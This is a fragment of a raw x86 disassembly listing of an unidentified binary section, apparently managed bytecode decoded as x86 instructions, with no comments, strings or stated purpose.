  402c0b:	jo     0x402c35
  402c0d:	ja     0x402c0f
  402c0f:	add    BYTE PTR [edx],cl
  402c11:	sub    al,0x7
  402c13:	pop    es
  402c14:	outs   dx,DWORD PTR ds:[esi]
  402c15:	jnp    0x402c17
  402c17:	add    BYTE PTR [edx],cl
  402c19:	sub    ch,BYTE PTR [eax]
  402c1b:	or     al,BYTE PTR [eax]
  402c1d:	add    BYTE PTR [esi],al
  402c1f:	sub    dl,BYTE PTR [esi+0x218014]
  402c25:	add    BYTE PTR [esi+edx*1],al
  402c28:	and    BYTE PTR [edx],0x0
  402c2b:	add    BYTE PTR [esi+edx*1],al
  402c2e:	and    BYTE PTR [ebx],0x0
  402c31:	add    BYTE PTR [esi+edx*1],al
  402c34:	and    BYTE PTR [eax+eax*1],0x0
  402c38:	add    al,0x16
  402c3a:	and    BYTE PTR ds:0x16040000,0x80
  402c41:	add    BYTE PTR es:[eax],al
  402c44:	add    al,0x2a
  402c46:	push   ds
  402c47:	add    ch,BYTE PTR [eax]
  402c49:	jl     0x402c4b
  402c4b:	add    BYTE PTR [edx],cl
  402c4d:	sub    bl,BYTE PTR [esi]
  402c4f:	add    ch,BYTE PTR [eax]
  402c51:	jl     0x402c53
  402c53:	add    BYTE PTR [edx],cl
  402c55:	sub    bl,BYTE PTR [esi]
  402c57:	add    bh,BYTE PTR [ebx+0x36]
  402c5a:	add    BYTE PTR [eax],al
  402c5c:	add    al,0x2a
  402c5e:	push   ds
  402c5f:	add    bh,BYTE PTR [ebx+0x37]
  402c62:	add    BYTE PTR [eax],al
  402c64:	add    al,0x2a
  402c66:	push   ds
  402c67:	add    bh,BYTE PTR [ebx+0x38]
  402c6a:	add    BYTE PTR [eax],al
  402c6c:	add    al,0x2a
  402c6e:	push   ds
  402c6f:	add    bh,BYTE PTR [ebx+0x39]
  402c72:	add    BYTE PTR [eax],al
  402c74:	add    al,0x2a
  402c76:	into   
  402c77:	add    dh,BYTE PTR [ebx+0x4f]
  402c7a:	add    BYTE PTR [eax],al
  402c7c:	push   es
  402c7d:	jge    0x402cb5
  402c7f:	add    BYTE PTR [eax],al
  402c81:	add    al,0x2
  402c83:	jae    0x402cd4
  402c85:	add    BYTE PTR [eax],al
  402c87:	push   es
  402c88:	jge    0x402cc1
  402c8a:	add    BYTE PTR [eax],al
  402c8c:	add    al,0x2
  402c8e:	jae    0x402d0d
  402c90:	add    BYTE PTR [eax],al
  402c92:	or     bh,BYTE PTR [ebp+0x38]
  402c95:	add    BYTE PTR [eax],al
  402c97:	add    al,0x2
  402c99:	jae    0x402d18
  402c9b:	add    BYTE PTR [eax],al
  402c9d:	or     bh,BYTE PTR [ebp+0x39]
  402ca0:	add    BYTE PTR [eax],al
  402ca2:	add    al,0x2
  402ca4:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402ca8:	or     ch,BYTE PTR [edx]
  402caa:	push   ds
  402cab:	add    bh,BYTE PTR [ebx+0x3a]
  402cae:	add    BYTE PTR [eax],al
  402cb0:	add    al,0x2a
  402cb2:	and    al,BYTE PTR [edx]
  402cb4:	add    edi,DWORD PTR [ebp+0x3a]
  402cb7:	add    BYTE PTR [eax],al
  402cb9:	add    al,0x2a
  402cbb:	push   ds
  402cbc:	add    bh,BYTE PTR [ebx+0x3b]
  402cbf:	add    BYTE PTR [eax],al
  402cc1:	add    al,0x2a
  402cc3:	push   ds
  402cc4:	add    bh,BYTE PTR [ebx+0x3c]
  402cc7:	add    BYTE PTR [eax],al
  402cc9:	add    al,0x2a
  402ccb:	push   ds
  402ccc:	add    bh,BYTE PTR [ebx+0x3d]
  402ccf:	add    BYTE PTR [eax],al
  402cd1:	add    al,0x2a
  402cd3:	push   ds
  402cd4:	add    bh,BYTE PTR [ebx+0x3e]
  402cd7:	add    BYTE PTR [eax],al
  402cd9:	add    al,0x2a
  402cdb:	push   ds
  402cdc:	add    bh,BYTE PTR [ebx+0x3f]
  402cdf:	add    BYTE PTR [eax],al
  402ce1:	add    al,0x2a
  402ce3:	push   ds
  402ce4:	add    bh,BYTE PTR [ebx+0x40]
  402ce7:	add    BYTE PTR [eax],al
  402ce9:	add    al,0x2a
  402ceb:	add    BYTE PTR [ebx],al
  402ced:	xor    BYTE PTR [edx],al
  402cef:	add    BYTE PTR [ecx+0x0],cl
  402cf2:	add    BYTE PTR [eax],al
  402cf4:	add    BYTE PTR [eax],al
  402cf6:	add    BYTE PTR [eax],al
  402cf8:	add    dh,BYTE PTR [ebx+0x7d]
  402cfb:	add    BYTE PTR [eax],al
  402cfd:	or     bh,BYTE PTR [ebp+0x3b]
  402d00:	add    BYTE PTR [eax],al
  402d02:	add    al,0x2
  402d04:	jae    0x402d83
  402d06:	add    BYTE PTR [eax],al
  402d08:	or     bh,BYTE PTR [ebp+0x3c]
  402d0b:	add    BYTE PTR [eax],al
  402d0d:	add    al,0x2
  402d0f:	jae    0x402d8e
  402d11:	add    BYTE PTR [eax],al
  402d13:	or     bh,BYTE PTR [ebp+0x3d]
  402d16:	add    BYTE PTR [eax],al
  402d18:	add    al,0x2
  402d1a:	jae    0x402d99
  402d1c:	add    BYTE PTR [eax],al
  402d1e:	or     bh,BYTE PTR [ebp+0x3e]
  402d21:	add    BYTE PTR [eax],al
  402d23:	add    al,0x2
  402d25:	jae    0x402da5
  402d27:	add    BYTE PTR [eax],al
  402d29:	or     bh,BYTE PTR [ebp+0x3f]
  402d2c:	add    BYTE PTR [eax],al
  402d2e:	add    al,0x2
  402d30:	jae    0x402db1
  402d32:	add    BYTE PTR [eax],al
  402d34:	or     bh,BYTE PTR [ebp+0x40]
  402d37:	add    BYTE PTR [eax],al
  402d39:	add    al,0x2
  402d3b:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402d3f:	or     ch,BYTE PTR [edx]
  402d41:	push   ds
  402d42:	add    bh,BYTE PTR [ebx+0x41]
  402d45:	add    BYTE PTR [eax],al
  402d47:	add    al,0x2a
  402d49:	dec    edx
  402d4a:	add    dh,BYTE PTR [ebx+0x7d]
  402d4d:	add    BYTE PTR [eax],al
  402d4f:	or     bh,BYTE PTR [ebp+0x41]
  402d52:	add    BYTE PTR [eax],al
  402d54:	add    al,0x2
  402d56:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402d5a:	or     ch,BYTE PTR [edx]
  402d5c:	push   ds
  402d5d:	add    bh,BYTE PTR [ebx+0x42]
  402d60:	add    BYTE PTR [eax],al
  402d62:	add    al,0x2a
  402d64:	push   ds
  402d65:	add    bh,BYTE PTR [ebx+0x43]
  402d68:	add    BYTE PTR [eax],al
  402d6a:	add    al,0x2a
  402d6c:	push   ds
  402d6d:	add    bh,BYTE PTR [ebx+0x44]
  402d70:	add    BYTE PTR [eax],al
  402d72:	add    al,0x2a
  402d74:	push   ds
  402d75:	add    bh,BYTE PTR [ebx+0x45]
  402d78:	add    BYTE PTR [eax],al
  402d7a:	add    al,0x2a
  402d7c:	jb     0x402d80
  402d7e:	jnp    0x402dc6
  402d80:	add    BYTE PTR [eax],al
  402d82:	add    al,0x3
  402d84:	outs   dx,DWORD PTR ds:[esi]
  402d85:	add    BYTE PTR [eax],0x0
  402d88:	or     ch,BYTE PTR ds:0x467b020d
  402d8e:	add    BYTE PTR [eax],al
  402d90:	add    al,0x3
  402d92:	pop    ss
  402d93:	outs   dx,DWORD PTR ds:[esi]
  402d94:	add    DWORD PTR [eax],0x362a0a00
  402d9a:	add    bh,BYTE PTR [ebx+0x46]
  402d9d:	add    BYTE PTR [eax],al
  402d9f:	add    al,0x3
  402da1:	outs   dx,DWORD PTR ds:[esi]
  402da2:	add    BYTE PTR [eax],0x0
  402da5:	or     ch,BYTE PTR [edx]
  402da7:	cli    
  402da8:	add    dh,BYTE PTR [ebx+0x7e]
  402dab:	add    BYTE PTR [eax],al
  402dad:	or     bh,BYTE PTR [ebp+0x42]
  402db0:	add    BYTE PTR [eax],al
  402db2:	add    al,0x2
  402db4:	jae    0x402e33
  402db6:	add    BYTE PTR [eax],al
  402db8:	or     bh,BYTE PTR [ebp+0x43]
  402dbb:	add    BYTE PTR [eax],al
  402dbd:	add    al,0x2
  402dbf:	jae    0x402dde
  402dc1:	add    BYTE PTR [eax],al
  402dc3:	push   es
  402dc4:	jge    0x402e0a
  402dc6:	add    BYTE PTR [eax],al
  402dc8:	add    al,0x2
  402dca:	jae    0x402e4a
  402dcc:	add    BYTE PTR [eax],al
  402dce:	or     bh,BYTE PTR [ebp+0x45]
  402dd1:	add    BYTE PTR [eax],al
  402dd3:	add    al,0x2
  402dd5:	jae    0x402d59
  402dd7:	add    BYTE PTR [eax],al
  402dd9:	or     bh,BYTE PTR [ebp+0x46]
  402ddc:	add    BYTE PTR [eax],al
  402dde:	add    al,0x2
  402de0:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402de4:	or     ch,BYTE PTR [edx]
  402de6:	push   ds
  402de7:	add    bh,BYTE PTR [ebx-0x7d]
  402dea:	add    BYTE PTR [eax],al
  402dec:	or     ch,BYTE PTR [edx]
  402dee:	push   ds
  402def:	add    bh,BYTE PTR [ebx-0x7c]
  402df2:	add    BYTE PTR [eax],al
  402df4:	or     ch,BYTE PTR [edx]
  402df6:	add    al,BYTE PTR ds:[ebx]
  402df9:	jge    0x402d7e
  402dfb:	add    BYTE PTR [eax],al
  402dfd:	or     al,BYTE PTR [edx]
  402dff:	pop    ss
  402e00:	jge    0x402d86
  402e02:	add    BYTE PTR [eax],al
  402e04:	or     ch,BYTE PTR [edx]
  402e06:	add    BYTE PTR [edx],0x7b
  402e09:	test   BYTE PTR [eax],al
  402e0b:	add    BYTE PTR [edx],cl
  402e0d:	sub    eax,0x1117206
  402e12:	add    BYTE PTR [eax+0x2a],dh
  402e15:	add    bh,BYTE PTR [ebx+eax*4+0x0]
  402e19:	add    BYTE PTR [edx],cl
  402e1b:	(bad)  
  402e1c:	push   ss
  402e1d:	or     eax,DWORD PTR [eax]
  402e1f:	add    BYTE PTR [ebx],bl
  402e21:	outs   dx,DWORD PTR ds:[esi]
  402e22:	test   DWORD PTR [eax],eax
  402e24:	add    BYTE PTR [edx],cl
  402e26:	sub    bl,BYTE PTR [esi]
  402e28:	add    ch,BYTE PTR [eax]
  402e2a:	jl     0x402e2c
  402e2c:	add    BYTE PTR [edx],cl
  402e2e:	sub    bl,BYTE PTR [edx]
  402e30:	jb     0x402ddb
  402e32:	add    DWORD PTR [eax],eax
  402e34:	jo     0x402e60
  402e36:	(bad)  
  402e37:	add    bh,BYTE PTR [ebx+0x4e]
  402e3a:	add    BYTE PTR [eax],al
  402e3c:	add    al,0x2d
  402e3e:	add    al,BYTE PTR es:[edx]
  402e41:	sub    BYTE PTR [eax],bh
  402e43:	add    BYTE PTR [eax],al
  402e45:	push   es
  402e46:	outs   dx,DWORD PTR ds:[esi]
  402e47:	adc    BYTE PTR [eax],al
  402e49:	add    BYTE PTR [esi],al
  402e4b:	outs   dx,DWORD PTR ds:[esi]
  402e4c:	dec    ebp
  402e4d:	add    BYTE PTR [eax],al
  402e4f:	push   es
  402e50:	add    ch,BYTE PTR [eax]
  402e52:	aaa    
  402e53:	add    BYTE PTR [eax],al
  402e55:	push   es
  402e56:	outs   dx,DWORD PTR ds:[esi]
  402e57:	and    al,BYTE PTR [eax]
  402e59:	add    BYTE PTR [esi],al
  402e5b:	sub    BYTE PTR [eax+eax*1],dh
  402e5e:	add    BYTE PTR [esi],al
  402e60:	jge    0x402eb0
  402e62:	add    BYTE PTR [eax],al
  402e64:	add    al,0x2
  402e66:	jnp    0x402eb6
  402e68:	add    BYTE PTR [eax],al
  402e6a:	add    al,0x2a
  402e6c:	(bad)  
  402e6d:	add    bh,BYTE PTR [ebx+0x4f]
  402e70:	add    BYTE PTR [eax],al
  402e72:	add    al,0x2d
  402e74:	add    al,BYTE PTR es:[edx]
  402e77:	sub    BYTE PTR [eax],bh
  402e79:	add    BYTE PTR [eax],al
  402e7b:	push   es
  402e7c:	outs   dx,DWORD PTR ds:[esi]
  402e7d:	adc    DWORD PTR [eax],eax
  402e7f:	add    BYTE PTR [esi],al
  402e81:	outs   dx,DWORD PTR ds:[esi]
  402e82:	dec    ebp
  402e83:	add    BYTE PTR [eax],al
  402e85:	push   es
  402e86:	add    ch,BYTE PTR [eax]
  402e88:	aaa    
  402e89:	add    BYTE PTR [eax],al
  402e8b:	push   es
  402e8c:	outs   dx,DWORD PTR ds:[esi]
  402e8d:	and    al,BYTE PTR [eax]
  402e8f:	add    BYTE PTR [esi],al
  402e91:	sub    BYTE PTR [eax+eax*1],dh
  402e94:	add    BYTE PTR [esi],al
  402e96:	jge    0x402ee7
  402e98:	add    BYTE PTR [eax],al
  402e9a:	add    al,0x2
  402e9c:	jnp    0x402eed
  402e9e:	add    BYTE PTR [eax],al
  402ea0:	add    al,0x2a
  402ea2:	(bad)  
  402ea3:	add    bh,BYTE PTR [ebx+0x50]
  402ea6:	add    BYTE PTR [eax],al
  402ea8:	add    al,0x2d
  402eaa:	add    al,BYTE PTR es:[edx]
  402ead:	sub    BYTE PTR [eax],bh
  402eaf:	add    BYTE PTR [eax],al
  402eb1:	push   es
  402eb2:	outs   dx,DWORD PTR ds:[esi]
  402eb3:	adc    BYTE PTR [eax],al
  402eb5:	add    BYTE PTR [esi],al
  402eb7:	outs   dx,DWORD PTR ds:[esi]
  402eb8:	dec    esi
  402eb9:	add    BYTE PTR [eax],al
  402ebb:	push   es
  402ebc:	add    ch,BYTE PTR [eax]
  402ebe:	aaa    
  402ebf:	add    BYTE PTR [eax],al
  402ec1:	push   es
  402ec2:	outs   dx,DWORD PTR ds:[esi]
  402ec3:	and    al,BYTE PTR [eax]
  402ec5:	add    BYTE PTR [esi],al
  402ec7:	sub    BYTE PTR [eax+eax*1],dh
  402eca:	add    BYTE PTR [esi],al
  402ecc:	jge    0x402f1e
  402ece:	add    BYTE PTR [eax],al
  402ed0:	add    al,0x2
  402ed2:	jnp    0x402f24
  402ed4:	add    BYTE PTR [eax],al
  402ed6:	add    al,0x2a
  402ed8:	(bad)  
  402ed9:	add    bh,BYTE PTR [ebx+0x51]
  402edc:	add    BYTE PTR [eax],al
  402ede:	add    al,0x2d
  402ee0:	add    al,BYTE PTR es:[edx]
  402ee3:	sub    BYTE PTR [eax],bh
  402ee5:	add    BYTE PTR [eax],al
  402ee7:	push   es
  402ee8:	outs   dx,DWORD PTR ds:[esi]
  402ee9:	adc    DWORD PTR [eax],eax
  402eeb:	add    BYTE PTR [esi],al
  402eed:	outs   dx,DWORD PTR ds:[esi]
  402eee:	dec    esi
  402eef:	add    BYTE PTR [eax],al
  402ef1:	push   es
  402ef2:	add    ch,BYTE PTR [eax]
  402ef4:	aaa    
  402ef5:	add    BYTE PTR [eax],al
  402ef7:	push   es
  402ef8:	outs   dx,DWORD PTR ds:[esi]
  402ef9:	and    al,BYTE PTR [eax]
  402efb:	add    BYTE PTR [esi],al
  402efd:	sub    BYTE PTR [eax+eax*1],dh
  402f00:	add    BYTE PTR [esi],al
  402f02:	jge    0x402f55
  402f04:	add    BYTE PTR [eax],al
  402f06:	add    al,0x2
  402f08:	jnp    0x402f5b
  402f0a:	add    BYTE PTR [eax],al
  402f0c:	add    al,0x2a
  402f0e:	add    BYTE PTR [eax],al
  402f10:	adc    esi,DWORD PTR [eax]
  402f12:	add    al,0x0
  402f14:	mov    eax,DWORD PTR [ecx]
  402f16:	add    BYTE PTR [eax],al
  402f18:	or     eax,DWORD PTR [eax]
  402f1a:	add    BYTE PTR [ecx],dl
  402f1c:	jae    0x402ea5
  402f1e:	add    BYTE PTR [eax],al
  402f20:	or     cl,BYTE PTR [edx]
  402f22:	add    ch,BYTE PTR [edi+0x17]
  402f25:	add    BYTE PTR [eax],al
  402f27:	push   es
  402f28:	outs   dx,DWORD PTR ds:[esi]
  402f29:	pop    ds
  402f2a:	add    BYTE PTR [eax],al
  402f2c:	or     ch,BYTE PTR [ebx+edx*1]
  402f2f:	push   es
  402f30:	add    ch,BYTE PTR [edi+0x17]
  402f33:	add    BYTE PTR [eax],al
  402f35:	push   es
  402f36:	outs   dx,DWORD PTR ds:[esi]
  402f37:	and    DWORD PTR [eax],eax
  402f39:	add    BYTE PTR [edx],cl
  402f3b:	outs   dx,DWORD PTR ds:[esi]
  402f3c:	mov    BYTE PTR [eax],al
  402f3e:	add    BYTE PTR [edx],cl
  402f40:	sub    ebx,DWORD PTR [esi]
  402f42:	add    ebp,DWORD PTR [edi+0x17]
  402f45:	add    BYTE PTR [eax],al
  402f47:	push   es
  402f48:	outs   dx,DWORD PTR ds:[esi]
  402f49:	pop    ds
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	or     ch,BYTE PTR [ecx+edx*1]
  402f4f:	push   es
  402f50:	add    ebp,DWORD PTR [edi+0x17]
  402f53:	add    BYTE PTR [eax],al
  402f55:	push   es
  402f56:	outs   dx,DWORD PTR ds:[esi]
  402f57:	and    DWORD PTR [eax],eax
  402f59:	add    BYTE PTR [edx],cl
  402f5b:	outs   dx,DWORD PTR ds:[esi]
  402f5c:	mov    BYTE PTR [eax],al
  402f5e:	add    BYTE PTR [edx],cl
  402f60:	add    ch,BYTE PTR [edi+0x18]
  402f63:	add    BYTE PTR [eax],al
  402f65:	push   es
  402f66:	outs   dx,DWORD PTR ds:[esi]
  402f67:	pop    ds
  402f68:	add    BYTE PTR [eax],al
  402f6a:	or     ch,BYTE PTR [ebx+edx*1]
  402f6d:	push   es
  402f6e:	add    ch,BYTE PTR [edi+0x18]
  402f71:	add    BYTE PTR [eax],al
  402f73:	push   es
  402f74:	outs   dx,DWORD PTR ds:[esi]
  402f75:	and    DWORD PTR [eax],eax
  402f77:	add    BYTE PTR [edx],cl
  402f79:	outs   dx,DWORD PTR ds:[esi]
  402f7a:	push   esi
  402f7b:	add    BYTE PTR [eax],al
  402f7d:	or     ch,BYTE PTR [ebx]
  402f7f:	push   ds
  402f80:	add    ebp,DWORD PTR [edi+0x18]
  402f83:	add    BYTE PTR [eax],al
  402f85:	push   es
  402f86:	outs   dx,DWORD PTR ds:[esi]
  402f87:	pop    ds
  402f88:	add    BYTE PTR [eax],al
  402f8a:	or     ch,BYTE PTR [ecx+edx*1]
  402f8d:	push   es
  402f8e:	add    ebp,DWORD PTR [edi+0x18]
  402f91:	add    BYTE PTR [eax],al
  402f93:	push   es
  402f94:	outs   dx,DWORD PTR ds:[esi]
  402f95:	and    DWORD PTR [eax],eax
  402f97:	add    BYTE PTR [edx],cl
  402f99:	outs   dx,DWORD PTR ds:[esi]
  402f9a:	push   esi
  402f9b:	add    BYTE PTR [eax],al
  402f9d:	or     al,BYTE PTR [edx]
  402f9f:	outs   dx,DWORD PTR ds:[esi]
  402fa0:	sbb    al,0x0
  402fa2:	add    BYTE PTR [esi],al
  402fa4:	outs   dx,DWORD PTR ds:[esi]
  402fa5:	mov    DWORD PTR [eax],eax
  402fa7:	add    BYTE PTR [edx],cl
  402fa9:	sub    al,0x13
  402fab:	push   es
  402fac:	add    ch,BYTE PTR [edi+0x1c]
  402faf:	add    BYTE PTR [eax],al
  402fb1:	push   es
  402fb2:	outs   dx,DWORD PTR ds:[esi]
  402fb3:	mov    al,BYTE PTR [eax]
  402fb5:	add    BYTE PTR [edx],cl
  402fb7:	outs   dx,DWORD PTR ds:[esi]
  402fb8:	mov    eax,DWORD PTR [eax]
  402fba:	add    BYTE PTR [edx],cl
  402fbc:	sub    eax,DWORD PTR [esi+0x3]
  402fbf:	outs   dx,DWORD PTR ds:[esi]
  402fc0:	sbb    al,0x0
  402fc2:	add    BYTE PTR [esi],al
  402fc4:	outs   dx,DWORD PTR ds:[esi]
  402fc5:	mov    DWORD PTR [eax],eax
  402fc7:	add    BYTE PTR [edx],cl
  402fc9:	sub    al,0x13
  402fcb:	push   es
  402fcc:	add    ebp,DWORD PTR [edi+0x1c]
  402fcf:	add    BYTE PTR [eax],al
  402fd1:	push   es
  402fd2:	outs   dx,DWORD PTR ds:[esi]
  402fd3:	mov    al,BYTE PTR [eax]
  402fd5:	add    BYTE PTR [edx],cl
  402fd7:	outs   dx,DWORD PTR ds:[esi]
  402fd8:	mov    eax,DWORD PTR [eax]
  402fda:	add    BYTE PTR [edx],cl
  402fdc:	sub    esp,DWORD PTR [esi]
  402fde:	jb     0x402f8e
  402fe0:	or     al,BYTE PTR [eax]
  402fe2:	jo     0x40300c
  402fe4:	mov    WORD PTR [eax],es
  402fe6:	add    BYTE PTR [edx],cl
  402fe8:	sub    al,0x1a
  402fea:	push   es
  402feb:	jb     0x402f9b
  402fed:	or     al,BYTE PTR [eax]
  402fef:	jo     0x403019
  402ff1:	mov    WORD PTR [eax],es
  402ff3:	add    BYTE PTR [edx],cl
  402ff5:	sub    BYTE PTR [edi+0x0],ch
  402ff8:	add    BYTE PTR [edx],cl
  402ffa:	sub    BYTE PTR [ebp+0x6f0a0000],cl
  403000:	mov    eax,DWORD PTR [eax]
  403002:	add    BYTE PTR [edx],cl
  403004:	add    ch,BYTE PTR [edi+0x1b]
  403007:	add    BYTE PTR [eax],al
  403009:	push   es
  40300a:	outs   dx,DWORD PTR ds:[esi]
  40300b:	adc    DWORD PTR [eax],eax
  40300d:	add    BYTE PTR [edx],cl
  40300f:	sub    al,0xc
  403011:	push   es
  403012:	pop    ss
  403013:	outs   dx,DWORD PTR ds:[esi]
  403014:	mov    es,WORD PTR [eax]
  403016:	add    BYTE PTR [edx],cl
  403018:	cmp    BYTE PTR [ebx+0x2000000],al
  40301e:	outs   dx,DWORD PTR ds:[esi]
  40301f:	sbb    DWORD PTR [eax],eax
  403021:	add    BYTE PTR [esi],al
  403023:	outs   dx,DWORD PTR ds:[esi]
  403024:	pop    ds
  403025:	add    BYTE PTR [eax],al
  403027:	or     ch,BYTE PTR [esi+eiz*1]
  40302a:	push   es
  40302b:	add    ch,BYTE PTR [edi+0x19]
  40302e:	add    BYTE PTR [eax],al
  403030:	push   es
  403031:	outs   dx,DWORD PTR ds:[esi]
  403032:	and    DWORD PTR [eax],eax
  403034:	add    BYTE PTR [edx],cl
  403036:	outs   dx,DWORD PTR ds:[esi]
  403037:	pop    DWORD PTR [eax]
  403039:	add    BYTE PTR [edx],cl
  40303b:	push   es
  40303c:	push   es
  40303d:	outs   dx,DWORD PTR ds:[esi]
  40303e:	pop    edx
  40303f:	add    BYTE PTR [eax],al
  403041:	or     al,BYTE PTR [edx]
  403043:	add    ebp,DWORD PTR [eax]
  403045:	xor    eax,0x6f060000
  40304a:	nop
  40304b:	add    BYTE PTR [eax],al
  40304d:	or     ch,BYTE PTR [ebx]
  40304f:	push   eax
  403050:	add    ebp,DWORD PTR [edi+0x1b]
  403053:	add    BYTE PTR [eax],al
  403055:	push   es
  403056:	outs   dx,DWORD PTR ds:[esi]
  403057:	adc    DWORD PTR [eax],eax
  403059:	add    BYTE PTR [edx],cl
  40305b:	sub    al,0x9
  40305d:	push   es
  40305e:	pop    ss
  40305f:	outs   dx,DWORD PTR ds:[esi]
  403060:	mov    es,WORD PTR [eax]
  403062:	add    BYTE PTR [edx],cl
  403064:	sub    edi,DWORD PTR [edx]
  403066:	add    ebp,DWORD PTR [edi+0x19]
  403069:	add    BYTE PTR [eax],al
  40306b:	push   es
  40306c:	outs   dx,DWORD PTR ds:[esi]
  40306d:	pop    ds
  40306e:	add    BYTE PTR [eax],al
  403070:	or     ch,BYTE PTR [esi+eiz*1]
  403073:	push   es
  403074:	add    ebp,DWORD PTR [edi+0x19]
  403077:	add    BYTE PTR [eax],al
  403079:	push   es
  40307a:	outs   dx,DWORD PTR ds:[esi]
  40307b:	and    DWORD PTR [eax],eax
  40307d:	add    BYTE PTR [edx],cl
  40307f:	outs   dx,DWORD PTR ds:[esi]
  403080:	pop    DWORD PTR [eax]
  403082:	add    BYTE PTR [edx],cl
  403084:	push   es
  403085:	push   es
  403086:	outs   dx,DWORD PTR ds:[esi]
  403087:	pop    edx
  403088:	add    BYTE PTR [eax],al
  40308a:	or     al,BYTE PTR [edx]
  40308c:	add    ebp,DWORD PTR [eax]
  40308e:	xor    eax,0x6f060000
  403093:	nop
  403094:	add    BYTE PTR [eax],al
  403096:	or     ch,BYTE PTR [ebx]
  403098:	pop    es
  403099:	push   es
  40309a:	pop    ss
  40309b:	outs   dx,DWORD PTR ds:[esi]
  40309c:	mov    es,WORD PTR [eax]
  40309e:	add    BYTE PTR [edx],cl
  4030a0:	push   es
  4030a1:	outs   dx,DWORD PTR ds:[esi]
  4030a2:	push   edi
  4030a3:	add    BYTE PTR [eax],al
  4030a5:	or     ch,BYTE PTR [edx]
  4030a7:	add    BYTE PTR [ebx],bl
  4030a9:	xor    BYTE PTR [ebx],al
  4030ab:	add    BYTE PTR [ebx+0xc000000],dh
  4030b1:	add    BYTE PTR [eax],al
  4030b3:	adc    DWORD PTR [edx+ecx*1],edx
  4030b6:	add    ebp,DWORD PTR [edi+0x1a]
  4030b9:	add    BYTE PTR [eax],al
  4030bb:	push   es
  4030bc:	outs   dx,DWORD PTR ds:[esi]
  4030bd:	pop    ds
  4030be:	add    BYTE PTR [eax],al
  4030c0:	or     ch,BYTE PTR [ecx+edx*1]
  4030c3:	add    ebp,DWORD PTR [edi+0x1a]
  4030c6:	add    BYTE PTR [eax],al
  4030c8:	push   es
  4030c9:	outs   dx,DWORD PTR ds:[esi]
  4030ca:	and    DWORD PTR [eax],eax
  4030cc:	add    BYTE PTR [edx],cl
  4030ce:	or     bh,BYTE PTR [eax]
  4030d0:	xchg   ecx,eax
  4030d1:	add    BYTE PTR [eax],al
  4030d3:	add    BYTE PTR [edi+ebp*2],al
  4030d6:	sbb    al,BYTE PTR [eax]
  4030d8:	add    BYTE PTR [esi],al
  4030da:	outs   dx,DWORD PTR ds:[esi]
  4030db:	pop    ds
  4030dc:	add    BYTE PTR [eax],al
  4030de:	or     ch,BYTE PTR [esi+ecx*1]
  4030e1:	add    al,0x6f
  4030e3:	sbb    al,BYTE PTR [eax]
  4030e5:	add    BYTE PTR [esi],al
  4030e7:	outs   dx,DWORD PTR ds:[esi]
  4030e8:	and    DWORD PTR [eax],eax
  4030ea:	add    BYTE PTR [edx],cl
  4030ec:	or     ch,BYTE PTR [ebx]
  4030ee:	jbe    0x403162
  4030f0:	aam    0xa
  4030f2:	add    BYTE PTR [eax+0x28],dh
  4030f5:	mov    WORD PTR [eax],es
  4030f7:	add    BYTE PTR [edx],cl
  4030f9:	sub    al,0xd
  4030fb:	jb     0x4030d1
  4030fd:	or     al,BYTE PTR [eax]
  4030ff:	jo     0x403129
  403101:	mov    WORD PTR [eax],es
  403103:	add    BYTE PTR [edx],cl
  403105:	or     ch,BYTE PTR [ebx]
  403107:	pop    ebp
  403108:	sub    BYTE PTR [edx],dl
  40310a:	add    BYTE PTR [eax],al
  40310c:	or     ch,BYTE PTR [eax]
  40310e:	pop    ebx
  40310f:	add    BYTE PTR [eax],al
  403111:	push   es
  403112:	add    ch,BYTE PTR [edi-0x6f]
  403115:	add    BYTE PTR [eax],al
  403117:	or     bl,BYTE PTR [edi]
  403119:	imul   BYTE PTR [eax]
  40311b:	sub    al,0x0
  40311d:	add    BYTE PTR [esi],al
  40311f:	or     edx,DWORD PTR [esi]
  403121:	or     al,0x7
  403123:	adc    al,BYTE PTR [edx]
  403125:	loopne 0x40314f
  403127:	sub    eax,0x26060000
  40312c:	or     BYTE PTR [edi],bl
  40312e:	sti    
  40312f:	pop    edi
  403130:	or     eax,0x2e280907
  403135:	add    BYTE PTR [eax],al
  403137:	push   es
  403138:	sub    BYTE PTR es:[edx+0x6f0a0000],dl
  40313f:	xchg   ebx,eax
  403140:	add    BYTE PTR [eax],al
  403142:	or     cl,BYTE PTR [edx]
  403144:	sub    BYTE PTR [edx],dl
  403146:	add    BYTE PTR [eax],al
  403148:	or     ch,BYTE PTR [edi-0x6c]
  40314b:	add    BYTE PTR [eax],al
  40314d:	or     bl,dh
  40314f:	or     DWORD PTR [edi],eax
  403151:	or     BYTE PTR [eax],ch
  403153:	add    BYTE PTR cs:[eax],al
  403156:	push   es
  403157:	fadd   QWORD PTR es:[ebx]
  40315a:	outs   dx,DWORD PTR ds:[esi]
  40315b:	sbb    al,BYTE PTR [eax]
  40315d:	add    BYTE PTR [esi],al
  40315f:	push   es
  403160:	outs   dx,DWORD PTR ds:[esi]
  403161:	xchg   ebp,eax
  403162:	add    BYTE PTR [eax],al
  403164:	or     al,BYTE PTR [esi]
  403166:	sub    al,BYTE PTR [eax]
  403168:	add    DWORD PTR [eax],edx
  40316a:	add    BYTE PTR [eax],al
  40316c:	add    al,BYTE PTR [eax]
  40316e:	jge    0x403170
  403170:	pop    ds
  403171:	pushf  
  403172:	add    BYTE PTR [ecx],cl
  403174:	add    BYTE PTR [eax],al
  403176:	add    BYTE PTR [eax],al
  403178:	adc    esi,DWORD PTR [eax]
  40317a:	add    eax,DWORD PTR [eax]
  40317c:	xchg   esi,eax
  40317d:	add    BYTE PTR [eax],al
  40317f:	add    BYTE PTR ds:0x4110000,cl
  403185:	push   ss
  403186:	push   esp
  403187:	add    ebp,DWORD PTR [edi-0x6a]
  40318a:	add    BYTE PTR [eax],al
  40318c:	or     ch,BYTE PTR ds:0x142a1602
  403192:	or     al,BYTE PTR [ebx]
  403194:	outs   dx,DWORD PTR ds:[esi]
  403195:	xchg   esi,eax
  403196:	add    BYTE PTR [eax],al
  403198:	or     dl,BYTE PTR [edi]
  40319a:	xor    ecx,DWORD PTR [eax]
  40319c:	jle    0x4031f2
  40319e:	add    BYTE PTR [eax],al
  4031a0:	add    al,0xa
  4031a2:	sub    esi,DWORD PTR [ebx]
  4031a4:	add    esi,DWORD PTR [edx-0xe]
  4031a7:	or     al,BYTE PTR [eax]
  4031a9:	jo     0x4031c6
